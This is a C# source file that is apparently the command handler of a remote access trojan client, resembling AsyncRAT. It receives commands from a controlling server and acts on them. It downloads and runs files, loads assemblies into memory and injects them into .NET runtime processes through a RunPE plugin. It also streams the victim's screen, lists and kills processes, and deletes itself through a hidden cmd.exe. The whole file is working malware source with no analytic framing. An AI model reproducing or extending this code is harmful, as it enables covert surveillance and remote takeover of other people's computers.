using Client.MessagePack;
using Client.Sockets;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Client.Handle_Packet
{
    class HandlePacket
    {
        /// Handle the packet
        public static void Read(object Data)
        {
            try
            {
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])Data);
                switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                {
                    case "sendMessage":
                        {
                            MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    case "Ping":
                        {
                            Debug.WriteLine("Server Pinged me " + unpack_msgpack.ForcePathObject("Message").AsString);
                        }
                        break;

                    case "sendFile":
                        {
                            Received();
                            string FullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                            unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
                            Process.Start(FullPath);
                            if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                            {
                                Uninstall();
                            }
                        }
                        break;

                    case "sendMemory":
                        {
                            Received();
                            byte[] Buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
                            string Injection = unpack_msgpack.ForcePathObject("Inject").AsString;
                            byte[] Plugin = unpack_msgpack.ForcePathObject("Plugin").GetAsBytes();
                            object[] parameters = new object[] { Buffer, Injection, Plugin };
                            Thread thread = null;
                            if (Injection.Length == 0)
                            {
                                thread = new Thread(new ParameterizedThreadStart(SendToMemory));
                            }
                            else
                            {
                                thread = new Thread(new ParameterizedThreadStart(RunPE));
                            }
                            thread.Start(parameters);
                        }
                        break;

                    case "close":
                        {
                            try
                            {
                                ClientSocket.Client.Shutdown(SocketShutdown.Both);
                            }
                            catch { }
                            Environment.Exit(0);
                        }
                        break;

                    case "uninstall":
                        {
                            Uninstall();
                        }
                        break;

                    case "remoteDesktop":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "false":
                                    {
                                        RemoteDesktop_Status = false;
                                    }
                                    break;

                                case "true":
                                    {
                                        RemoteDesktop_Status = true;
                                        RemoteDesktop();
                                    }
                                    break;
                            }
                        }
                        break;

                    case "processManager":
                        {
                            switch (unpack_msgpack.ForcePathObject("Option").AsString)
                            {
                                case "List":
                                    {
                                        ProcessManager();
                                    }
                                    break;

                                case "Kill":
                                    {
                                        ProcessKill(Convert.ToInt32(unpack_msgpack.ForcePathObject("ID").AsString));
                                    }
                                    break;
                            }
                        }
                        break;
                }
            }
            catch { }
        }

        private static void Received()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "Received";
            ClientSocket.BeginSend(msgpack.Encode2Bytes());
        }

        private static void ProcessKill(int ID)
        {
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    if (process.Id == ID)
                    {
                        process.Kill();
                    }
                }
                catch { };
            }
            ProcessManager();
        }

        private static void ProcessManager()
        {
            StringBuilder sb = new StringBuilder();
            var query = "SELECT ProcessId, Name, ExecutablePath FROM Win32_Process";
            using (var searcher = new ManagementObjectSearcher(query))
            using (var results = searcher.Get())
            {
                var processes = results.Cast<ManagementObject>().Select(x => new
                {
                    ProcessId = (UInt32)x["ProcessId"],
                    Name = (string)x["Name"],
                    ExecutablePath = (string)x["ExecutablePath"]
                });
                foreach (var p in processes)
                {
                    if (File.Exists(p.ExecutablePath))
                    {
                        string name = p.ExecutablePath;
                        string key = p.ProcessId.ToString();
                        Icon icon = Icon.ExtractAssociatedIcon(p.ExecutablePath);
                        Bitmap bmpIcon = icon.ToBitmap();
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bmpIcon.Save(ms, ImageFormat.Png);
                            sb.Append(name + "-=>" + key + "-=>" + Convert.ToBase64String(ms.ToArray()) + "-=>");
                        }
                    }
                }
            }
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "processManager";
            msgpack.ForcePathObject("Message").AsString = sb.ToString();
            ClientSocket.BeginSend(msgpack.Encode2Bytes());
        }

        private static bool RemoteDesktop_Status { get; set; }
        private static void RemoteDesktop()
        {
            try
            {
                IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(80);
                while (RemoteDesktop_Status == true)
                {
                    Thread.Sleep(1);
                    if (!ClientSocket.Client.Connected) break;
                    Bitmap bmp = CaptureScreen();
                    Rectangle rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    Size size = new Size(bmp.Width, bmp.Height);
                    BitmapData bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite, bmp.PixelFormat);

                    using (MemoryStream stream = new MemoryStream(1000000))
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, rect, size, bmp.PixelFormat, stream);
                        if (stream.Length > 0)
                        {
                            MsgPack msgpack = new MsgPack();
                            msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            ClientSocket.BeginSend(msgpack.Encode2Bytes());
                        }
                    }
                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
            }
            catch { }
        }

        private static Bitmap CaptureScreen()
        {
            Rectangle rect = Screen.AllScreens[0].WorkingArea;
            try
            {
                Bitmap bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                Graphics gfxScreenshot = Graphics.FromImage(bmpScreenshot);
                gfxScreenshot.CopyFromScreen(0, 0, 0, 0, new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                gfxScreenshot.Dispose();
                return bmpScreenshot;
            }
            catch { return new Bitmap(rect.Width, rect.Height); }
        }


        private static void Uninstall()
        {
            ProcessStartInfo Del = null;
            try
            {
                Del = new ProcessStartInfo()
                {
                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Process.GetCurrentProcess().MainModule.FileName,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    FileName = "cmd.exe"
                };

                ClientSocket.Client.Shutdown(SocketShutdown.Both);
                ClientSocket.Client.Close();
            }
            catch { }
            finally
            {
                Process.Start(Del);
                Environment.Exit(0);
            }
        }

        private static void SendToMemory(object obj)
        {
            object[] Obj = (object[])obj;
            byte[] Buffer = (byte[])Obj[0];
            Assembly Loader = Assembly.Load(Buffer);
            object[] Parameters = null;
            if (Loader.EntryPoint.GetParameters().Length > 0)
            {
                Parameters = new object[] { new string[] { null } };
            }
            Loader.EntryPoint.Invoke(null, Parameters);
        }

        private static void RunPE(object obj)
        {
            try
            {
                object[] Parameters = (object[])obj;
                byte[] File = (byte[])Parameters[0];
                string Injection = Convert.ToString(Parameters[1]);
                byte[] Plugin = (byte[])Parameters[2];
                Assembly Loader = Assembly.Load(Plugin);
                Loader.GetType("Plugin.Program").GetMethod("Run").Invoke(null, new object[] { File, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), Injection) });
            }
            catch { }
        }
    }
}
